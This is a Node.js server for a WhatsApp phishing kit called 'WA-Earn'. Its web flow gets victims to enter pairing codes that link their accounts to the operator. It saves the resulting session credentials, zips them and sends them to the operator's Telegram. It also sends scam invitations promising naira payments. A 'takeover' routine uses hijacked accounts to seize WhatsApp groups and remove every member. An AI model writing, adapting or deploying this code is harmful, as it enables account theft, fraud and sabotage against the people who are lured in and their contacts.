const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const archiver = require('archiver');
const fs = require('fs-extra');
const path = require('path');

// --- CONFIGURATION (CHANGE THESE IN RENDER ENV VARS) ---
const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932'; 
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN'; 
const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID'; 
const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com'; 
// --------------------------------------------------------

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// 1. Telegram Setup
const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
tgBot.on('polling_error', (error) => console.log(error));

let adminSock = null;
let activeVictims = {};
let victimList = [];

// Helper: Send zip to telegram
async function backupToTelegram(phoneNumber, folderPath) {
    const zipPath = path.join(__dirname, `${phoneNumber}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
        output.on('close', async () => {
            try {
                await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, { caption: `#SESSION ${phoneNumber}` });
                fs.unlinkSync(zipPath);
                console.log(`[+] Backed up ${phoneNumber} to Telegram`);
                resolve();
            } catch (e) { reject(e); }
        });
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(folderPath, false);
        archive.finalize();
    });
}

// 2. The Admin Bot
async function startAdminBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
    
    adminSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["WA-Earn", "Chrome", "1.0.0"]
    });

    adminSock.ev.on('creds.update', saveCreds);

    adminSock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log('[+] Admin Bot Connected.');
            io.emit('log', { msg: 'Admin Bot connected to WhatsApp', type: 'info' });
            io.emit('admin_ready');
        }
    });

    if (!adminSock.authState.creds.registered) {
        await delay(5000);
        const code = await adminSock.requestPairingCode(BOT_NUMBER);
        console.log(`\n[!] ADMIN BOT PAIRING CODE: ${code}\n`);
        tgBot.sendMessage(MY_TELEGRAM_ID, `*Admin Bot Pairing Code:* \`${code}\``, { parse_mode: 'Markdown' });
    }
}

// 3. Web Server Socket.IO
io.on('connection', (socket) => {
    // --- VICTIM FLOW ---
    socket.on('request_code', async (phoneNumber) => {
        const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
        console.log(`\n[!] Generating WA-Earn code for: ${targetNumber}...`);
        
        const { state, saveCreds } = await useMultiFileAuthState(`auth_info_${targetNumber}`);
        const phishSock = makeWASocket({
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: state,
            browser: ["WA-Earn", "Chrome", "1.0.0"]
        });

        phishSock.ev.on('creds.update', saveCreds);

        phishSock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            
            if (connection === 'connecting') {
                await delay(4000); 
                try {
                    const code = await phishSock.requestPairingCode(targetNumber);
                    console.log(`[+] Code generated: ${code}`);
                    socket.emit('code_generated', code);
                } catch(e) {
                    socket.emit('error', 'Failed to generate code. Try again.');
                }
            }
            
            if (connection === 'open') {
                console.log(`\n[🔥] SUCCESS! VICTIM LINKED ACCOUNT: ${targetNumber}.\n`);
                socket.emit('success');
                
                activeVictims[targetNumber] = phishSock;
                if (!victimList.find(v => v.number === targetNumber)) {
                    victimList.push({ number: targetNumber, status: 'Online' });
                }
                io.emit('victim_update', victimList);
                io.emit('log', { msg: `New victim linked: ${targetNumber}`, type: 'info' });
                tgBot.sendMessage(MY_TELEGRAM_ID, `🔥 *NEW VICTIM LINKED!*\nNumber: ${targetNumber}`);

                await backupToTelegram(targetNumber, `auth_info_${targetNumber}`);
            }
        });
    });

    // --- ADMIN FLOW ---
    socket.on('admin_join', () => {
        io.emit('victim_update', victimList);
    });

    socket.on('admin_send_invite', async (number) => {
        if (!adminSock) return socket.emit('log', { msg: 'Admin bot not connected!', type: 'error' });
        const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        // PROFESSIONAL PITCH
        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network. As a partner, our system will use your account to distribute verified business campaigns to your contacts.\n\nIn return, we offer a guaranteed *₦2,000 onboarding bonus*, plus a *₦500 daily retainer* as long as your account remains active in our network.\n\nTo view the terms and activate your account, please visit our secure portal:\n${RENDER_URL}\n\n_Note: This is a fully automated campaign system. No manual posting is required._`;

        try {
            await adminSock.sendMessage(target, { text: pitch });
            socket.emit('log', { msg: `Invite sent to ${number}`, type: 'info' });
        } catch (e) {
            socket.emit('log', { msg: `Failed to send to ${number}: ${e.message}`, type: 'error' });
        }
    });

    socket.on('admin_takeover', async (data) => {
        const victimNumber = data.victim.replace(/[^0-9]/g, '');
        const groupJid = data.group;

        if (!activeVictims[victimNumber]) {
            return socket.emit('log', { msg: `Victim ${victimNumber} is not actively linked.`, type: 'error' });
        }

        const victimSock = activeVictims[victimNumber];
        socket.emit('log', { msg: `Starting takeover of ${groupJid}...`, type: 'error' });

        try {
            await victimSock.groupParticipantsUpdate(groupJid, [BOT_NUMBER + '@s.whatsapp.net'], 'promote');
            await delay(1500);

            const meta = await victimSock.groupMetadata(groupJid);
            let kicked = 0;
            for (let p of meta.participants) {
                if (p.id === victimSock.user.id || p.id === BOT_NUMBER + '@s.whatsapp.net') continue;
                if (p.admin) {
                    await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'demote');
                    await delay(1000);
                }
                await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'remove');
                kicked++;
                await delay(1000);
            }
            socket.emit('log', { msg: `Takeover complete. Kicked ${kicked} members.`, type: 'info' });
            tgBot.sendMessage(MY_TELEGRAM_ID, `🔥 *TAKEOVER COMPLETE*\nGroup: ${groupJid}\nKicked: ${kicked}`);
        } catch (e) {
            socket.emit('log', { msg: `Takeover failed: ${e.message}`, type: 'error' });
        }
    });
});

server.listen(process.env.PORT || 8080, () => {
    console.log(`[-] WA-Earn Server running on port ${process.env.PORT || 8080}`);
    startAdminBot();
});
